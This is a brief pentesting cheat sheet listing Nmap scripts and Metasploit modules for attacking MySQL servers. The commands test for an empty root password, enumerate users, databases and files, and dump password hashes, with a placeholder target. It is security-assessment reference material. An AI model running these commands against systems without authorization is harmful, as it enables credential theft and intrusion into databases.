<h1>Nmap</h1>

`nmap --script=mysql-empty-password -p 3306 <target>`

`nmap --script=mysql-info -p 3306 <target>`

`nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 <target>`

`nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 <target>`

`nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 <target>`

`nmap --script=mysql-dump-hashes --script-args="username='root',password=''" -p 3306 <target>`

`nmap --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.pass='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 <target>`

<h1>Metasploit</h1>

`msf6 > use auxiliary/scanner/mysql/mysql_writable_dirs`

`msf6 > use auxiliary/scanner/mysql/mysql_file_enum`

`msf6 > use auxiliary/scanner/mysql/mysql_hashdump`